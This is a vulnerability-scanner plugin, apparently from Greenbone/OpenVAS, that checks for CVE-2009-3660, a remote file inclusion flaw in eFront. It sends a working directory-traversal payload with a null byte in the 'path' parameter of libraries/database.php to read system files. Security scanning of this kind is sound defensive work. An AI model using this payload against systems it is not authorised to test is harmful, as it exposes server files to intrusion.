CPE = "cpe:/a:efrontlearning:efront";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901045" );
	script_version( "2021-09-01T12:57:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 12:57:33 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2009-10-31 09:54:01 +0100 (Sat, 31 Oct 2009)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-3660" );
	script_bugtraq_id( 36411 );
	script_name( "eFront 'database.php' Remote File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_efront_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "efront/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary code on the
  vulnerable Web server." );
	script_tag( name: "affected", value: "eFront version 3.5.4 and prior." );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user supplied data and can be
  exploited via 'path' parameter in 'libraries/database.php' to include and
  execute remote files on the affected system." );
	script_tag( name: "solution", value: "Apply the patch from the referenced link." );
	script_tag( name: "summary", value: "This host is running eFront and is prone to Remote File Inclusion
  vulnerability." );
	script_xref( name: "URL", value: "http://svn.efrontlearning.net/repos/efront/trunc/libraries/database.php" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/36411" );
	script_xref( name: "URL", value: "https://cxsecurity.com/issue/WLB-2009090034" );
	script_xref( name: "URL", value: "http://forum.efrontlearning.net/viewtopic.php?f=1&t=1354&p=7174#p7174" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/../libraries/database.php?path=../../../../../../../../../" + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
	url = dir + "/libraries/database.php?path=../../../../../../../../../" + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

